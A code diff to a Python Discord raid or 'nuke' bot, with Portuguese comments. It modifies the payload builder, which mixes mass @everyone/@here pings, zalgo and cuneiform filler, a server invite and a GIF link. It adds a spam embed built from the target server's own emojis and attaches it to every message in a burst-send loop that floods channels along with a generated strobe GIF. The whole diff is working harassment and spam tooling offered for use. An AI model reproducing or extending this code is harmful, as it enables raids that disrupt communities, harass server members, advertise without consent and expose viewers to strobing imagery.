@@ -165,8 +165,8 @@ def build_nuke_payload() -> str:
        2) @everyone/@here em massa
        3) cuneiforme+zalgo pra encher
        4) URL do GIF custom SEMPRE no final (preview visivel)"""
-    # 1) texto visivel + convite do server
-    header = f"🔥 **{SOCIETY_LINE.upper()}** 🔥\n**discord.gg/TGaUktD9D**"
+    # 1) texto visivel + convite do server (link puro pra renderizar preview)
+    header = f"🔥 **{SOCIETY_LINE.upper()}** 🔥\ndiscord.gg/TGaUktD9D"
     # 2) pings
     pings = " ".join(random.choice(["@everyone", "@here", "@everyone @everyone",
                                     "@here @here", "@everyone @here"])
@@ -271,6 +271,24 @@ STROBE_GIF = make_strobe_gif()
 
 def _gif_file() -> discord.File:
     return discord.File(io.BytesIO(STROBE_GIF), filename="set-society.gif")
+
+
+def _spam_embed(guild) -> discord.Embed | None:
+    """Embed bonitinha com os emojis custom do server (grid 5 por linha)."""
+    try:
+        pool = [str(e) for e in getattr(guild, "emojis", [])]
+    except Exception:
+        return None
+    if len(pool) < 4:
+        return None
+    random.shuffle(pool)
+    titulo = f"{pool[0]} SET SOCIETY {pool[1]}"
+    linhas = [" ".join(pool[i:i + 5]) for i in range(2, min(len(pool), 32), 5)]
+    emb = discord.Embed(title=titulo, description="\n".join(linhas),
+                        color=0x9B59B6, url="https://discord.gg/TGaUktD9D")
+    emb.add_field(name="entre ai", value="discord.gg/TGaUktD9D", inline=False)
+    emb.set_footer(text=SOCIETY_LINE)
+    return emb
 
 
 
@@ -533,13 +551,15 @@ async def _burst_send(channel, n: int, base: str | None) -> int:
     sem_ping = False
     espera_total = 0.0
     _last_burst_error = ""
+    emb = _spam_embed(getattr(channel, "guild", None))
     for _ in range(n):
         try:
             if base:
                 msg = f"{base}\n\n{SOCIETY_LINE}\ndiscord.gg/TGaUktD9D\n{GIF_CUSTOM_URLS[0]}"
             else:
                 msg = build_nuke_payload()
-            await channel.send(msg[:2000], allowed_mentions=MENTIONS_SEM_PING if sem_ping else MENTIONS,
+            await channel.send(msg[:2000], embed=emb,
+                               allowed_mentions=MENTIONS_SEM_PING if sem_ping else MENTIONS,
                                file=_gif_file())
             ok += 1
         except discord.HTTPException as e:
